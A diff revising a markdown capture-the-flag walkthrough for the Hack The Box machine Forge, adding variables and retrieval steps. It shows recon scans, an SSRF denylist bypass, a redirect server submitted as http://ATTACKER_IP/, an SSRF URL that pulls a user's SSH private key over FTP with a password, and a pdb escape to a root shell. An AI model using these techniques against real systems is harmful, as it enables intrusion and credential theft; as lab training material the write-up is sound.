@@ -21,35 +21,39 @@ Commands and output, one line per step. The reasoning, the dead ends, and why ea
 
 Commands are formatted from my May notes rather than a fresh replay. The script internals in step 8 come from the source captured in [0xdf's write-up](https://0xdf.gitlab.io/2022/01/22/htb-forge.html#exploit); my notes recorded the behaviour, not the mechanism.
 
-Target: `<target>`, attacker: `<attacker-ip>`. My notes never recorded either address.
+My notes never recorded either address, and the directory wordlist was not named either. Set them first.
 
 ## Recon
 
 ```bash
-nmap -p- --min-rate 10000 -T4 -oA nmap/allports <target>
+TARGET=10.10.10.10        # replace with the box address for your session
+ATTACKER=10.10.14.10      # replace with your VPN address
+WORDLIST=/usr/share/wordlists/dirb/common.txt   # my notes never named the one I used
+mkdir -p nmap
+nmap -p- --min-rate 10000 -T4 -oA nmap/allports "$TARGET"
 ```
 
 Ports 22 and 80 answer, 21 comes back filtered. My notes kept no scan output.
 
 ```bash
-echo "<target> forge.htb" | sudo tee -a /etc/hosts
+echo "$TARGET forge.htb" | sudo tee -a /etc/hosts
 ```
 
 ```bash
 gobuster vhost -u http://forge.htb \
   -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r --append-domain
-gobuster dir -u http://forge.htb -w /usr/share/wordlists/dirb/<wordlist>.txt
+gobuster dir -u http://forge.htb -w "$WORDLIST"
 ```
 
 The vhost scan hits `admin.forge.htb`, which serves localhost only. `/upload` takes a file or a URL.
 
 ```bash
-echo "<target> admin.forge.htb" | sudo tee -a /etc/hosts
+echo "$TARGET admin.forge.htb" | sudo tee -a /etc/hosts
 ```
 
 ## Foothold
 
-**1. The denylist.** `http://127.0.0.1` and `http://forge.htb` return `URL contains blacklisted address`. `http://127.1` also fails; my notes did not keep its response.
+**1. The denylist.** `http://127.0.0.1` and `http://forge.htb` return `URL contains blacklisted address`. `http://127.1` also failed for me; my notes did not keep its response, and [0xdf's tests](https://0xdf.gitlab.io/2022/01/22/htb-forge.html#bypassing) had it pass the filter, so I cannot attribute my failure to the denylist.
 
 **2. Case manipulation gets through.**
 
@@ -57,7 +61,11 @@ echo "<target> admin.forge.htb" | sudo tee -a /etc/hosts
 http://ADMIN.FORGE.HTB
 ```
 
-The fetched body is stored as the uploaded "image", so the admin page's HTML comes back in the upload. Read it in Burp.
+Every submission below is two requests. Submit the URL to `/upload`, then GET the `/uploads/` link that submission returns; the fetched body is stored there as the uploaded "image", so that second response is where the content is. The generated name changes every time.
+
+```bash
+curl http://forge.htb/uploads/GENERATED_NAME
+```
 
 A redirect server on the attacker box is the other way in:
 
@@ -78,6 +86,12 @@ HTTPServer(('0.0.0.0', 80), Redirect).serve_forever()
 
 ```bash
 sudo python3 redirect.py http://admin.forge.htb
+```
+
+Then submit our own address, which is not on the denylist, and retrieve the upload the same way:
+
+```text
+http://ATTACKER_IP/
 ```
 
 **3. The announcements page.**
@@ -117,6 +131,7 @@ http://ADMIN.Forge.Htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb/.ssh/i
 ```
 
 ```bash
+curl http://forge.htb/uploads/GENERATED_NAME -o id_rsa
 chmod 600 id_rsa
 ssh -i id_rsa user@forge.htb
 ```
@@ -136,7 +151,7 @@ User user may run the following commands on forge:
 
 **8. What the script does.** It binds a random high port, takes a password over the socket, and puts the menu choice straight into `int()` inside a `try`.
 
-```python
+```text
 port = random.randint(1025, 65535)
 ...
 option = int(clientsock.recv(1024).strip())
@@ -150,13 +165,13 @@ except Exception as e:
 
 ```bash
 sudo /usr/bin/python3 /opt/remote-manage.py
-# Listening on localhost:<port>
+# prints the random high port it is listening on
 ```
 
 **10. Session B, a second SSH session.** Authenticate, then send a non-integer.
 
 ```bash
-nc localhost <port>
+nc localhost PORT   # the port session A printed
 ```
 
 Type the password, then a non-integer at the menu:
@@ -168,8 +183,8 @@ asdf
 
 **11. Session A drops to the debugger.** `int('asdf')` raises, the handler passes the traceback to `pdb.post_mortem`, and the prompt lands on the sudo process's own stdin.
 
-```python
-(pdb) import os; os.system('/bin/bash')
+```text
+(Pdb) import os; os.system('/bin/bash')
 ```
 
 ```bash
